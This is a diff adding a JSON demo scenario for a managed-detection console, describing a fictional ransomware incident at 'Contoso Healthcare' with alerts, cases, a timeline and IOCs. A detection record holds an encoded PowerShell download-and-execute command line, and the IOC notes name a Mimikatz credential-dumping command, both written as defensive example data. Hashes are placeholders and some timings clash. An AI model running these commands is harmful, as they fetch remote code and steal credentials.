@@ -1,0 +1,1214 @@
+{
+  "id": "mdr-default",
+  "name": "MDR Response",
+  "description": "Sophos MDR detected a ransomware attack at 2am, isolated affected hosts within 8 minutes, and delivered a full incident report by morning. The customer slept through the entire thing.",
+  "version": 1,
+  "createdAt": "2026-03-23T00:00:00Z",
+  "customer": {
+    "name": "Contoso Healthcare",
+    "industry": "healthcare",
+    "endpointCount": 2500,
+    "serverCount": 186
+  },
+  "alerts": {
+    "mode": "override",
+    "items": [
+      {
+        "product": "endpoint",
+        "threat": "Troj/Ransom-GNX",
+        "threat_cleanable": false,
+        "created_at": "-6h",
+        "severity": "high",
+        "actionable": false,
+        "category": "runtime_detections",
+        "when": "-6h",
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
+        "location": "DESKTOP-FIN042",
+        "type": "Event::Endpoint::CoreDetection::CryptoGuard",
+        "source": null,
+        "data": {
+          "created_at": "-6h",
+          "endpoint_type": "computer",
+          "endpoint_platform": "windows"
+        },
+        "description": "CryptoGuard blocked ransomware encryption on DESKTOP-FIN042 at 2:39 AM. Sophos MDR team was notified immediately. 127 files protected from encryption.",
+        "info": "MDR team responded within 8 minutes. Device isolated at 2:47 AM."
+      },
+      {
+        "product": "endpoint",
+        "threat": "Cobalt Strike Beacon",
+        "threat_cleanable": false,
+        "created_at": "-7h",
+        "severity": "high",
+        "actionable": false,
+        "category": "runtime_detections",
+        "when": "-7h",
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
+        "location": "DESKTOP-FIN042",
+        "type": "Event::Endpoint::CoreDetection::SuspiciousActivity",
+        "source": null,
+        "data": {
+          "created_at": "-7h",
+          "endpoint_type": "computer",
+          "endpoint_platform": "windows"
+        },
+        "description": "Command and control beacon detected on DESKTOP-FIN042. Outbound connection to 185.220.101.47:443 established via rundll32.exe. MDR team tracking attacker activity.",
+        "info": "C2 channel identified \u2014 MDR monitoring lateral movement attempts"
+      },
+      {
+        "product": "endpoint",
+        "threat": null,
+        "threat_cleanable": null,
+        "created_at": "-6h",
+        "severity": "high",
+        "actionable": false,
+        "category": "runtime_detections",
+        "when": "-6h",
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
+        "location": "SRV-FS01",
+        "type": "Event::Endpoint::CoreDetection::SuspiciousActivity",
+        "source": null,
+        "data": {
+          "created_at": "-6h",
+          "endpoint_type": "server",
+          "endpoint_platform": "windows"
+        },
+        "description": "Lateral movement attempt detected: DESKTOP-FIN042 \u2192 SRV-FS01 via SMB using stolen credentials (svc-backup). MDR team blocked at 2:44 AM before file server was compromised.",
+        "info": "Lateral movement blocked \u2014 service account credentials compromised"
+      },
+      {
+        "product": "endpoint",
+        "threat": "Mal/Phish-A",
+        "threat_cleanable": true,
+        "created_at": "-8h",
+        "severity": "medium",
+        "actionable": false,
+        "category": "malware",
+        "when": "-8h",
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
+        "location": "DESKTOP-FIN042",
+        "type": "Event::Endpoint::Threat::Detected",
+        "source": null,
+        "data": {
+          "created_at": "-8h",
+          "endpoint_type": "computer",
+          "endpoint_platform": "windows"
+        },
+        "description": "Initial access: Malicious Excel macro detected in 'Q1_Budget_Review.xlsm' delivered via email. Macro downloaded second-stage payload from compromised WordPress site.",
+        "info": "Delivery vector identified \u2014 spearphishing email to sarah.chen@{{customerDomain}}"
+      },
+      {
+        "product": "endpoint",
+        "threat": null,
+        "threat_cleanable": null,
+        "created_at": "-5h",
+        "severity": "low",
+        "actionable": false,
+        "category": "policy",
+        "when": "-5h",
+        "allowedActions": [
+          "ACKNOWLEDGE"
+        ],
+        "location": "DESKTOP-FIN042",
+        "type": "Event::Endpoint::UpdateSuccess",
+        "source": null,
+        "data": {
+          "created_at": "-5h",
+          "endpoint_type": "computer",
+          "endpoint_platform": "windows"
+        },
+        "description": "MDR remediation complete: DESKTOP-FIN042 cleaned, malicious files removed, persistence mechanisms cleared. Device cleared for reconnection pending customer approval.",
+        "info": "Full remediation performed by Sophos MDR Team"
+      }
+    ],
+    "summaryDelta": {
+      "high": 3,
+      "medium": 1,
+      "low": 1
+    }
+  },
+  "cases": {
+    "mode": "override",
+    "items": [
+      {
+        "type": "investigation",
+        "name": "MDR-{{customerName}}: Ransomware Incident \u2014 Contained",
+        "managedBy": "mtr",
+        "createdAt": "-7h",
+        "createdBy": {
+          "name": "Sophos MDR Team"
+        },
+        "updatedAt": "-4h",
+        "status": "containment",
+        "initialDetection": {
+          "severity": 9,
+          "type": "Threat",
+          "detectionRule": "WIN-IMP-PRC-COBALT-STRIKE-C2-BEACON-1",
+          "mitreAttacks": [
+            {
+              "tactic": {
+                "id": "TA0001",
+                "name": "Initial Access",
+                "techniques": [
+                  {
+                    "id": "T1566.001",
+                    "name": "Spearphishing Attachment"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0002",
+                "name": "Execution",
+                "techniques": [
+                  {
+                    "id": "T1059.001",
+                    "name": "PowerShell"
+                  },
+                  {
+                    "id": "T1204.002",
+                    "name": "Malicious File"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0003",
+                "name": "Persistence",
+                "techniques": [
+                  {
+                    "id": "T1053.005",
+                    "name": "Scheduled Task"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0011",
+                "name": "Command and Control",
+                "techniques": [
+                  {
+                    "id": "T1071.001",
+                    "name": "Web Protocols"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0008",
+                "name": "Lateral Movement",
+                "techniques": [
+                  {
+                    "id": "T1021.002",
+                    "name": "SMB/Windows Admin Shares"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0040",
+                "name": "Impact",
+                "techniques": [
+                  {
+                    "id": "T1486",
+                    "name": "Data Encrypted for Impact"
+                  },
+                  {
+                    "id": "T1490",
+                    "name": "Inhibit System Recovery"
+                  }
+                ]
+              }
+            }
+          ],
+          "time": "-7h",
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
+        },
+        "assignee": {
+          "name": "Sophos MDR Team"
+        },
+        "overview": "INCIDENT SUMMARY\n\nAt 01:42 AM, a spearphishing email delivered a malicious Excel macro to sarah.chen (Finance). The macro downloaded a Cobalt Strike beacon establishing C2 with 185.220.101.47. At 02:31 AM, the attacker attempted lateral movement to SRV-FS01 (file server) using stolen svc-backup credentials. At 02:39 AM, ransomware deployment began \u2014 CryptoGuard blocked encryption.\n\nMDR RESPONSE\n\u2022 02:39 AM \u2014 Alert triggered, MDR analyst assigned\n\u2022 02:44 AM \u2014 Lateral movement blocked, SRV-FS01 protected\n\u2022 02:47 AM \u2014 DESKTOP-FIN042 isolated from network\n\u2022 03:15 AM \u2014 C2 IP blocked at firewall (185.220.101.47)\n\u2022 03:30 AM \u2014 Compromised credentials (svc-backup) flagged for reset\n\u2022 04:45 AM \u2014 Full remediation complete: malware removed, persistence cleared\n\u2022 06:00 AM \u2014 Incident report delivered to customer\n\nIMPACT: 1 endpoint compromised (DESKTOP-FIN042). Lateral movement blocked before file server was reached. Zero data loss. Zero files encrypted (CryptoGuard). Estimated attacker dwell time: 57 minutes before containment.\n\nSTATUS: Contained. Awaiting customer approval to bring DESKTOP-FIN042 back online.",
+        "detectionCount": 18,
+        "escalated": true
+      },
+      {
+        "type": "investigation",
+        "name": "(SRV-FS01) | Lateral Movement via SMB \u2014 {{customerName}}",
+        "managedBy": "mtr",
+        "createdAt": "-2d",
+        "createdBy": {
+          "name": "Sophos MDR Team"
+        },
+        "updatedAt": "-1d",
+        "status": "resolved",
+        "initialDetection": {
+          "severity": 8,
+          "type": "Threat",
+          "detectionRule": "WIN-IMP-PRC-LATERAL-MOVEMENT-SMB-1",
+          "mitreAttacks": [
+            {
+              "tactic": {
+                "id": "TA0008",
+                "name": "Lateral Movement",
+                "techniques": [
+                  {
+                    "id": "T1021.002",
+                    "name": "SMB/Windows Admin Shares"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0006",
+                "name": "Credential Access",
+                "techniques": [
+                  {
+                    "id": "T1003.001",
+                    "name": "LSASS Memory"
+                  }
+                ]
+              }
+            }
+          ],
+          "time": "-2d",
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
+        },
+        "assignee": {
+          "name": "Sophos MDR Team"
+        },
+        "overview": "MDR detected lateral movement from DESKTOP-FIN042 to SRV-FS01 using compromised svc-backup credentials. SMB admin share access was blocked. Credentials flagged for immediate reset. No data accessed on file server.",
+        "detectionCount": 6,
+        "escalated": true
+      },
+      {
+        "type": "investigation",
+        "name": "(DESKTOP-HR003) | Phishing \u2014 Credential Harvesting Blocked",
+        "managedBy": "mtr",
+        "createdAt": "-5d",
+        "createdBy": {
+          "name": "Sophos MDR Team"
+        },
+        "updatedAt": "-4d",
+        "status": "closed",
+        "initialDetection": {
+          "severity": 6,
+          "type": "Threat",
+          "detectionRule": "MAL-WEB-PHISHING-CREDENTIAL-HARVEST-1",
+          "mitreAttacks": [
+            {
+              "tactic": {
+                "id": "TA0001",
+                "name": "Initial Access",
+                "techniques": [
+                  {
+                    "id": "T1566.002",
+                    "name": "Spearphishing Link"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0006",
+                "name": "Credential Access",
+                "techniques": [
+                  {
+                    "id": "T1056.004",
+                    "name": "Web Portal Capture"
+                  }
+                ]
+              }
+            }
+          ],
+          "time": "-5d",
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
+        },
+        "assignee": {
+          "name": "Sophos MDR Team"
+        },
+        "overview": "Targeted phishing email impersonating Microsoft 365 login sent to HR department. User clicked link but Sophos Web Protection blocked the credential harvesting page. MDR confirmed no credentials were compromised. Sender domain added to block list.",
+        "detectionCount": 2,
+        "escalated": false
+      },
+      {
+        "type": "investigation",
+        "name": "(SRV-DC01) | Suspicious Scheduled Task \u2014 Persistence Attempt",
+        "managedBy": "mtr",
+        "createdAt": "-8d",
+        "createdBy": {
+          "name": "Sophos MDR Team"
+        },
+        "updatedAt": "-7d",
+        "status": "closed",
+        "initialDetection": {
+          "severity": 7,
+          "type": "Threat",
+          "detectionRule": "WIN-PER-SCHTASK-ENCODED-COMMAND-1",
+          "mitreAttacks": [
+            {
+              "tactic": {
+                "id": "TA0003",
+                "name": "Persistence",
+                "techniques": [
+                  {
+                    "id": "T1053.005",
+                    "name": "Scheduled Task"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0002",
+                "name": "Execution",
+                "techniques": [
+                  {
+                    "id": "T1059.001",
+                    "name": "PowerShell"
+                  }
+                ]
+              }
+            }
+          ],
+          "time": "-8d",
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
+        },
+        "assignee": {
+          "name": "Sophos MDR Team"
+        },
+        "overview": "Base64-encoded PowerShell scheduled task created on domain controller SRV-DC01. MDR identified this as a persistence mechanism from a previous compromise attempt. Task was removed, system scanned clean. Root cause traced to exposed RDP port \u2014 remediation guidance provided.",
+        "detectionCount": 4,
+        "escalated": true
+      },
+      {
+        "type": "investigation",
+        "name": "(LAPTOP-EXEC01) | Suspicious Data Staging \u2014 Exfiltration Prevented",
+        "managedBy": "mtr",
+        "createdAt": "-12d",
+        "createdBy": {
+          "name": "Sophos MDR Team"
+        },
+        "updatedAt": "-11d",
+        "status": "closed",
+        "initialDetection": {
+          "severity": 8,
+          "type": "Threat",
+          "detectionRule": "WIN-EXF-ARCHIVE-SENSITIVE-DATA-STAGING-1",
+          "mitreAttacks": [
+            {
+              "tactic": {
+                "id": "TA0009",
+                "name": "Collection",
+                "techniques": [
+                  {
+                    "id": "T1560.001",
+                    "name": "Archive via Utility"
+                  }
+                ]
+              }
+            },
+            {
+              "tactic": {
+                "id": "TA0010",
+                "name": "Exfiltration",
+                "techniques": [
+                  {
+                    "id": "T1567.002",
+                    "name": "Exfiltration to Cloud Storage"
+                  }
+                ]
+              }
+            }
+          ],
+          "time": "-12d",
+          "sensor": {
+            "type": "endpoint",
+            "source": "Sophos Endpoint"
+          }
+        },
+        "assignee": {
+          "name": "Sophos MDR Team"
+        },
+        "overview": "MDR detected bulk archiving of financial documents on executive laptop LAPTOP-EXEC01, with attempted upload to personal cloud storage. Upload was blocked by DLP policy. Investigation confirmed the activity was from a compromised account \u2014 password reset enforced, MFA enrollment required.",
+        "detectionCount": 8,
+        "escalated": true
+      }
+    ]
+  },
+  "detections": {
+    "mode": "override",
+    "items": [
+      {
+        "detectionCreatedAt": "-8h",
+        "connectorGeneratedAt": "-8h",
+        "connector": {
+          "id": "SophosSensorID",
+          "type": "endpoint",
+          "vendor": "Sophos",
+          "version": "SED Driver 4.2.1"
+        },
+        "device": {
+          "type": "computer",
+          "hostname": "DESKTOP-FIN042"
+        },
+        "rawData": {
+          "meta_hostname": "DESKTOP-FIN042",
+          "meta_ip_address": "192.168.1.42",
+          "meta_os_name": "Microsoft Windows 11 Enterprise",
+          "meta_username": "sarah.chen",
+          "cmdline": "EXCEL.EXE /e \"C:\\Users\\sarah.chen\\Downloads\\Q1_Budget_Review.xlsm\"",
+          "path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+          "parent_name": "outlook.exe"
+        },
+        "risk": 7,
+        "category": "Threat",
+        "classificationRule": "WIN-EXE-OFC-MACRO-DOWNLOAD-PAYLOAD-1",
+        "ruleDescription": "Office application executed macro that downloaded remote payload",
+        "mitreAttacks": [
+          {
+            "tactic": {
+              "id": "TA0001",
+              "name": "Initial Access",
+              "techniques": [
+                {
+                  "id": "T1566.001",
+                  "name": "Spearphishing Attachment"
+                }
+              ]
+            }
+          },
+          {
+            "tactic": {
+              "id": "TA0002",
+              "name": "Execution",
+              "techniques": [
+                {
+                  "id": "T1204.002",
+                  "name": "Malicious File"
+                }
+              ]
+            }
+          }
+        ],
+        "attackType": "Phishing",
+        "severity": 7,
+        "detectionAttack": {
+          "name": "Ransomware Kill Chain"
+        },
+        "detectionLicenses": [
+          "XDR"
+        ],
+        "geolocation": {},
+        "intelixFileReputation": {
+          "score": 80,
+          "label": "Suspicious"
+        },
+        "detectionType": "Threat",
+        "suppressed": false,
+        "caseDescription": "Initial access \u2014 spearphishing macro"
+      },
+      {
+        "detectionCreatedAt": "-7h",
+        "connectorGeneratedAt": "-7h",
+        "connector": {
+          "id": "SophosSensorID",
+          "type": "endpoint",
+          "vendor": "Sophos",
+          "version": "SED Driver 4.2.1"
+        },
+        "device": {
+          "type": "computer",
+          "hostname": "DESKTOP-FIN042"
+        },
+        "rawData": {
+          "meta_hostname": "DESKTOP-FIN042",
+          "meta_ip_address": "192.168.1.42",
+          "meta_os_name": "Microsoft Windows 11 Enterprise",
+          "meta_username": "sarah.chen",
+          "cmdline": "rundll32.exe C:\\Users\\sarah.chen\\AppData\\Local\\Temp\\msupdate.dll,DllRegisterServer",
+          "path": "C:\\Windows\\System32\\rundll32.exe",
+          "parent_name": "powershell.exe",
+          "sha256": "8a2f3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a"
+        },
+        "risk": 9,
+        "category": "Threat",
+        "classificationRule": "WIN-IMP-PRC-COBALT-STRIKE-C2-BEACON-1",
+        "ruleDescription": "Cobalt Strike beacon loaded via rundll32 \u2014 C2 connection established to 185.220.101.47",
+        "mitreAttacks": [
+          {
+            "tactic": {
+              "id": "TA0011",
+              "name": "Command and Control",
+              "techniques": [
+                {
+                  "id": "T1071.001",
+                  "name": "Web Protocols"
+                }
+              ]
+            }
+          }
+        ],
+        "attackType": "C2",
+        "severity": 9,
+        "detectionAttack": {
+          "name": "Ransomware Kill Chain"
+        },
+        "detectionLicenses": [
+          "XDR"
+        ],
+        "geolocation": {},
+        "intelixFileReputation": {
+          "score": 100,
+          "label": "Known Malicious"
+        },
+        "detectionType": "Threat",
+        "suppressed": false,
+        "caseDescription": "Cobalt Strike C2 beacon"
+      },
+      {
+        "detectionCreatedAt": "-6h",
+        "connectorGeneratedAt": "-6h",
+        "connector": {
+          "id": "SophosSensorID",
+          "type": "endpoint",
+          "vendor": "Sophos",
+          "version": "SED Driver 4.2.1"
+        },
+        "device": {
+          "type": "computer",
+          "hostname": "DESKTOP-FIN042"
+        },
+        "rawData": {
+          "meta_hostname": "DESKTOP-FIN042",
+          "meta_ip_address": "192.168.1.42",
+          "meta_os_name": "Microsoft Windows 11 Enterprise",
+          "meta_username": "SYSTEM",
+          "cmdline": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcA",
+          "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "parent_name": "rundll32.exe",
+          "sha256": "0ff6f2c94bc7e2833a5f7e16de1622e5dba70396f31c7d5f56381870317e8c46"
+        },
+        "risk": 9,
+        "category": "Threat",
+        "classificationRule": "WIN-IMP-PRC-SHADOWCOPY-SELECT-DELETE-RESIZE-1",
+        "ruleDescription": "Shadow copy deletion via encoded PowerShell \u2014 ransomware preparation",
+        "mitreAttacks": [
+          {
+            "tactic": {
+              "id": "TA0040",
+              "name": "Impact",
+              "techniques": [
+                {
+                  "id": "T1490",
+                  "name": "Inhibit System Recovery"
+                }
+              ]
+            }
+          }
+        ],
+        "attackType": "Ransomware",
+        "severity": 9,
+        "detectionAttack": {
+          "name": "Ransomware Kill Chain"
+        },
+        "detectionLicenses": [
+          "XDR"
+        ],
+        "geolocation": {},
+        "intelixFileReputation": {
+          "score": 100,
+          "label": "Known Malicious"
+        },
+        "detectionType": "Threat",
+        "suppressed": false,
+        "caseDescription": "Shadow copy deletion \u2014 ransomware staging"
+      }
+    ]
+  },
+  "caseDetail": {
+    "activities": {
+      "items": [
+        {
+          "userName": "System",
+          "action": "Case auto-created from high-severity detection: Cobalt Strike C2 beacon on DESKTOP-FIN042",
+          "category": "caseActivity",
+          "createdAt": "-7h"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Case escalated to MDR \u2014 priority assignment to senior threat analyst",
+          "category": "caseActivity",
+          "createdAt": "-6h55m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Initial triage complete. Confirmed Cobalt Strike beacon (PID 7842) communicating with C2 at 185.220.101.47:443. Entry vector: spearphishing email with malicious Excel macro delivered to sarah.chen@{{customerDomain}}",
+          "category": "caseActivity",
+          "createdAt": "-6h45m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Threat hunting initiated across all endpoints. Scanning for lateral movement indicators and additional beacons.",
+          "category": "caseActivity",
+          "createdAt": "-6h30m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Lateral movement detected: DESKTOP-FIN042 attempted SMB connection to SRV-FS01 using compromised svc-backup credentials. Connection BLOCKED by Sophos.",
+          "category": "caseActivity",
+          "createdAt": "-6h15m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "DESKTOP-FIN042 isolated from network via Sophos API. Device can no longer communicate with internal resources or external C2.",
+          "category": "caseActivity",
+          "createdAt": "-6h10m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "CryptoGuard blocked ransomware encryption attempt on DESKTOP-FIN042. Shadow copy deletion also blocked. Zero files encrypted.",
+          "category": "caseActivity",
+          "createdAt": "-6h05m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Firewall rule deployed: all outbound traffic to 185.220.101.47 blocked across all network zones.",
+          "category": "caseActivity",
+          "createdAt": "-5h45m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Compromised credential identified: svc-backup (service account). Flagged for immediate password reset. Kerberos tickets invalidated.",
+          "category": "caseActivity",
+          "createdAt": "-5h30m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Full malware analysis complete. Artifacts: Q1_Budget_Review.xlsm (macro dropper), update_helper.dll (Cobalt Strike loader), svchost_alt.exe (persistence). All files quarantined.",
+          "category": "caseActivity",
+          "createdAt": "-5h"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Persistence mechanisms removed: Scheduled task 'WindowsHealthCheck' deleted, registry run key cleaned, dropped files removed from C:\\ProgramData\\Microsoft\\Crypto\\.",
+          "category": "caseActivity",
+          "createdAt": "-4h30m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Endpoint scan complete on all 3 affected hosts. No additional indicators of compromise found. Threat contained to DESKTOP-FIN042.",
+          "category": "caseActivity",
+          "createdAt": "-4h"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Incident report generated and delivered to customer. Recommendations: (1) Reset svc-backup credentials, (2) Enable MFA on all service accounts, (3) Review email gateway rules for macro-enabled attachments, (4) Bring DESKTOP-FIN042 back online after verification.",
+          "category": "caseActivity",
+          "createdAt": "-3h30m"
+        },
+        {
+          "userName": "Sophos MDR Team",
+          "action": "Case status updated: CONTAINMENT \u2192 awaiting customer approval to restore DESKTOP-FIN042 to network.",
+          "category": "caseActivity",
+          "createdAt": "-3h"
+        }
+      ],
+      "pages": {
+        "current": 1,
+        "size": 20,
+        "total": 1,
+        "items": 14
+      }
+    },
+    "mitreSummary": {
+      "tactics": [
+        {
+          "id": "TA0001",
+          "name": "Initial Access",
+          "techniques": [
+            {
+              "id": "T1566.001",
+              "name": "Spearphishing Attachment",
+              "description": "Malicious Excel macro delivered via targeted email to Finance department"
+            }
+          ]
+        },
+        {
+          "id": "TA0002",
+          "name": "Execution",
+          "techniques": [
+            {
+              "id": "T1059.001",
+              "name": "PowerShell",
+              "description": "Encoded PowerShell used to download Cobalt Strike beacon"
+            },
+            {
+              "id": "T1204.002",
+              "name": "Malicious File",
+              "description": "User opened Q1_Budget_Review.xlsm enabling macro execution"
+            }
+          ]
+        },
+        {
+          "id": "TA0003",
+          "name": "Persistence",
+          "techniques": [
+            {
+              "id": "T1053.005",
+              "name": "Scheduled Task",
+              "description": "Scheduled task 'WindowsHealthCheck' created for beacon persistence"
+            }
+          ]
+        },
+        {
+          "id": "TA0005",
+          "name": "Defense Evasion",
+          "techniques": [
+            {
+              "id": "T1562.001",
+              "name": "Disable or Modify Tools",
+              "description": "Attempted to disable Windows Defender real-time protection (blocked by tamper protection)"
+            }
+          ]
+        },
+        {
+          "id": "TA0006",
+          "name": "Credential Access",
+          "techniques": [
+            {
+              "id": "T1003.001",
+              "name": "LSASS Memory",
+              "description": "Cobalt Strike Mimikatz module extracted svc-backup credentials from LSASS"
+            }
+          ]
+        },
+        {
+          "id": "TA0008",
+          "name": "Lateral Movement",
+          "techniques": [
+            {
+              "id": "T1021.002",
+              "name": "SMB/Windows Admin Shares",
+              "description": "Attempted SMB lateral movement to SRV-FS01 using svc-backup \u2014 BLOCKED"
+            }
+          ]
+        },
+        {
+          "id": "TA0011",
+          "name": "Command and Control",
+          "techniques": [
+            {
+              "id": "T1071.001",
+              "name": "Web Protocols",
+              "description": "HTTPS C2 channel to 185.220.101.47:443 via Cobalt Strike Malleable C2 profile"
+            }
+          ]
+        },
+        {
+          "id": "TA0040",
+          "name": "Impact",
+          "techniques": [
+            {
+              "id": "T1486",
+              "name": "Data Encrypted for Impact",
+              "description": "Ransomware encryption attempt BLOCKED by CryptoGuard"
+            },
+            {
+              "id": "T1490",
+              "name": "Inhibit System Recovery",
+              "description": "Shadow copy deletion attempted via vssadmin \u2014 BLOCKED"
+            }
+          ]
+        }
+      ]
+    },
+    "impactedEntities": {
+      "items": [
+        {
+          "id": "auto",
+          "name": "DESKTOP-FIN042",
+          "type": "device",
+          "detections": [
+            {
+              "id": "auto",
+              "detectionRule": "WIN-IMP-PRC-COBALT-STRIKE-C2-BEACON-1"
+            },
+            {
+              "id": "auto",
+              "detectionRule": "WIN-EXE-OFC-MACRO-DOWNLOAD-PAYLOAD-1"
+            },
+            {
+              "id": "auto",
+              "detectionRule": "WIN-IMP-PRC-SHADOWCOPY-SELECT-DELETE-RESIZE-1"
+            },
+            {
+              "id": "auto",
+              "detectionRule": "WIN-PER-SCHTASK-ENCODED-COMMAND-1"
+            },
+            {
+              "id": "auto",
+              "detectionRule": "WIN-CRD-LSASS-MEMORY-DUMP-MIMIKATZ-1"
+            }
+          ]
+        },
+        {
+          "id": "auto",
+          "name": "SRV-FS01",
+          "type": "device",
+          "detections": [
+            {
+              "id": "auto",
+              "detectionRule": "WIN-LAT-SMB-ADMIN-SHARE-ACCESS-1"
+            }
+          ]
+        },
+        {
+          "id": "auto",
+          "name": "185.220.101.47",
+          "type": "ip_address",
+          "detections": []
+        },
+        {
+          "id": "auto",
+          "name": "sarah.chen",
+          "type": "user",
+          "detections": []
+        }
+      ],
+      "pages": {
+        "current": 1,
+        "size": 50,
+        "total": 1,
+        "items": 4
+      }
+    },
+    "notebook": {
+      "items": [
+        {
+          "id": "auto",
+          "title": "Executive Summary",
+          "content": "At 01:42 AM, a targeted spearphishing email was delivered to sarah.chen in Finance containing a malicious Excel macro (Q1_Budget_Review.xlsm). The macro downloaded a Cobalt Strike beacon that established C2 communication with 185.220.101.47. The attacker extracted service account credentials (svc-backup) and attempted lateral movement to the file server SRV-FS01. Sophos blocked the lateral movement, CryptoGuard prevented ransomware encryption, and MDR isolated the compromised device within 28 minutes of initial detection. Zero data was lost or encrypted.\n\nDwell time: 57 minutes (detection to full containment)\nImpact: 1 endpoint compromised, 0 files encrypted, 0 data exfiltrated\nStatus: Contained, awaiting customer approval to restore device",
+          "createdAt": "-3h30m",
+          "updatedAt": "-3h30m",
+          "createdBy": {
+            "name": "Sophos MDR Team"
+          }
+        },
+        {
+          "id": "auto",
+          "title": "Attack Timeline",
+          "content": "01:42 AM \u2014 Spearphishing email delivered to sarah.chen@{{customerDomain}}\n01:43 AM \u2014 User opens Q1_Budget_Review.xlsm, macro executes\n01:44 AM \u2014 PowerShell downloads Cobalt Strike stager from 185.220.101.47\n01:45 AM \u2014 Cobalt Strike beacon established (PID 7842, rundll32.exe)\n02:15 AM \u2014 Mimikatz module extracts svc-backup credentials from LSASS\n02:31 AM \u2014 Lateral movement attempt: SMB to SRV-FS01 using svc-backup \u2014 BLOCKED\n02:39 AM \u2014 Ransomware deployment begins \u2014 CryptoGuard BLOCKS encryption\n02:39 AM \u2014 Shadow copy deletion attempted \u2014 BLOCKED\n02:39 AM \u2014 MDR alert triggered, analyst assigned\n02:44 AM \u2014 MDR confirms Cobalt Strike, begins containment\n02:47 AM \u2014 DESKTOP-FIN042 isolated from network\n03:15 AM \u2014 C2 IP 185.220.101.47 blocked at firewall\n03:30 AM \u2014 svc-backup credentials flagged for reset\n04:00 AM \u2014 Malware analysis complete, all artifacts quarantined\n04:30 AM \u2014 Persistence mechanisms removed\n05:00 AM \u2014 Full endpoint scan clean\n06:00 AM \u2014 Incident report delivered to customer",
+          "createdAt": "-3h",
+          "updatedAt": "-3h",
+          "createdBy": {
+            "name": "Sophos MDR Team"
+          }
+        },
+        {
+          "id": "auto",
+          "title": "Recommendations",
+          "content": "IMMEDIATE ACTIONS (within 24 hours):\n1. Reset svc-backup service account password and rotate all associated Kerberos tickets\n2. Enable MFA on all service accounts and admin accounts\n3. Review and restrict SMB access between workstation and server segments\n4. Block macro-enabled email attachments at the email gateway\n\nSHORT-TERM (within 1 week):\n5. Conduct phishing awareness training focused on Finance department\n6. Implement application whitelisting on critical servers (SRV-FS01)\n7. Deploy network segmentation between workstation and server VLANs\n8. Review and tighten service account permissions (least privilege)\n\nLONG-TERM:\n9. Deploy ZTNA for remote access (replace VPN)\n10. Implement PAM solution for service account management\n11. Enable Sophos MDR Complete for 24/7 threat hunting",
+          "createdAt": "-3h",
+          "updatedAt": "-3h",
+          "createdBy": {
+            "name": "Sophos MDR Team"
+          }
+        },
+        {
+          "id": "auto",
+          "title": "IOCs (Indicators of Compromise)",
+          "content": "FILES:\n\u2022 Q1_Budget_Review.xlsm \u2014 SHA256: 4a8b3f2e1d9c7b5a6e8f0d2c4b6a8e0f2d4c6b8a0e2f4d6c8b0a2e4f6d8c0b\n\u2022 update_helper.dll \u2014 SHA256: 7c9d1e3f5a2b4d6e8f0a2c4d6e8b0f2a4c6d8e0b2a4c6d8e0f2a4c6d8e0b2a\n\u2022 svchost_alt.exe \u2014 SHA256: 2b4d6e8f0a2c4d6e8b0f2a4c6d8e0b2a4c6d8e0f2a4c6d8e0b2a4c6d8e0f2a\n\nNETWORK:\n\u2022 C2 Server: 185.220.101.47:443 (HTTPS)\n\u2022 Cobalt Strike Malleable C2 Profile: jquery-c2.4.7\n\u2022 User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)\n\nPERSISTENCE:\n\u2022 Scheduled Task: WindowsHealthCheck (schtasks /create /tn)\n\u2022 Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate\n\u2022 Drop path: C:\\ProgramData\\Microsoft\\Crypto\\RSA\\MachineKeys\\\n\nCREDENTIALS:\n\u2022 Compromised: svc-backup (domain service account)\n\u2022 Method: Mimikatz sekurlsa::logonpasswords",
+          "createdAt": "-4h",
+          "updatedAt": "-3h30m",
+          "createdBy": {
+            "name": "Sophos MDR Team"
+          }
+        }
+      ],
+      "pages": {
+        "current": 1,
+        "size": 10,
+        "total": 1,
+        "items": 4
+      }
+    },
+    "extraActivities": [
+      {
+        "userName": "Sophos MDR Team",
+        "action": "Case created \u2014 ransomware indicators detected on DESKTOP-FIN042. MDR analyst assigned.",
+        "category": "caseActivity",
+        "createdAt": "-7h"
+      },
